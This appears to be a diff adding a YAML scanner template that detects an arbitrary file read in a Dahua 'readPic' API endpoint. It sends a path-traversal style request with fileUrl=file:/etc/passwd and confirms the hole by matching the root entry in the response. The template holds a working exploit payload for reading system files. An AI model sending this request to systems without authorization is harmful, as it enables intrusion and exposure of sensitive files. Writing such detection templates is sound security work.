@@ -1,0 +1,16 @@
+name: dahua-wulian-readPic-file-read
+set:
+  s1: randomInt(1000,9999)
+  s2: randomInt(10000,99999)
+  rboundary: randomInt(800000000, 1000000000)
+groups:
+  rules1:  
+  - method: GET
+    path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+      Accept-Encoding: gzip
+    search:
+    followredirects: false
+    body: |
+    expression: response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
